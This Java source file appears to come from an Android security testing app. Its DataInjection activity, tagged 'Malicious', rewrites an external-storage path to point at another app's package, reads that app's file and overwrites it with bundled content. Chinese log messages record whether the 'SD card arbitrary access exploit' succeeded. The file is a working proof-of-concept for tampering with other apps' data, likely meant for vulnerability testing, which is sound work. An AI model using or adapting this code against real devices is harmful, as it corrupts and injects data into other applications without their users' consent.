package com.example.ask.ui.storage;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;

import com.example.ask.MainActivity;
import com.example.ask.R;
import com.example.ask.util.FileUtil;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class DataInjection extends Activity {

    private static String TAG = "Malicious";
    private static String appFilePath;
    private static String packageName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.storge_data_injection);

        int REQUEST_EXTERNAL_STORAGE = 1;
        String[] PERMISSIONS_STORAGE = {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
        int permission = ActivityCompat.checkSelfPermission(DataInjection.this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int permission1 = ActivityCompat.checkSelfPermission(DataInjection.this, Manifest.permission.READ_EXTERNAL_STORAGE);

        if (permission != PackageManager.PERMISSION_GRANTED || permission1 != PackageManager.PERMISSION_GRANTED) {
            // We don't have permission so prompt the user
            ActivityCompat.requestPermissions(DataInjection.this, PERMISSIONS_STORAGE, REQUEST_EXTERNAL_STORAGE);
        }

        Intent receiverIntent = getIntent();
        appFilePath = receiverIntent.getStringExtra("appFilePath");
        packageName = receiverIntent.getStringExtra("packageName");
    }

    private void writeToFile() {
        TextView res = (TextView) findViewById(R.id.result);
        File file = new File(getExternalFilesDir(null), appFilePath);
        String absPath = file.getAbsolutePath();
        String myPath = absPath.replace("com.example.ask", packageName);
        Log.d("ExternalStorageBenign", "Benign = " + file.getAbsolutePath());
        Log.d("ExternalStorageBenign", "Mal = " + myPath);
        FileUtil.saveResultToFile("文件路径：" + myPath, this);
        try {
            InputStream test = new FileInputStream(new File(myPath));
            byte[] datas = new byte[test.available()];
            test.read(datas);
            System.out.println(test.toString());
            FileUtil.saveResultToFile("文件内容：\n" + test.toString(), this);
            test.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try (InputStream is = getResources().openRawResource(R.raw.bible);
             OutputStream os = new FileOutputStream(new File(myPath))) {
            byte[] data = new byte[is.available()];
            is.read(data);
            os.write(data);
            Log.d("ExternalStorageBenign", myPath + " written successfully");
            res.setText("written successfully");
            FileUtil.saveResultToFile("written successfully", this);
            FileUtil.saveResultToFile("写入文件内容：\n" + data.toString(), this);
            FileUtil.saveResultToFile("SD卡任意访问利用成功！", this);
        } catch (IOException e) {
            e.printStackTrace();
            res.setText("Unable to write into file");
            FileUtil.saveResultToFile("无法成功写入文件！", this);
            FileUtil.saveResultToFile("SD卡任意访问利用失败！", this);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (checkPermission("android.permission.WRITE_EXTERNAL_STORAGE",
                android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d("ExternalStorageBenign", "android.permission.WRITE_EXTERNAL_STORAGE already granted");
            writeToFile();
        } else {
            Log.d("ExternalStorageBenign", "need android.permission.WRITE_EXTERNAL_STORAGE permission");
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, 100);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == 100) {
            if (permissions[0].equalsIgnoreCase("android.permission.WRITE_EXTERNAL_STORAGE") &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                writeToFile();
            } else {
                throw new RuntimeException("Permission has not granted");
            }
        }
    }
}
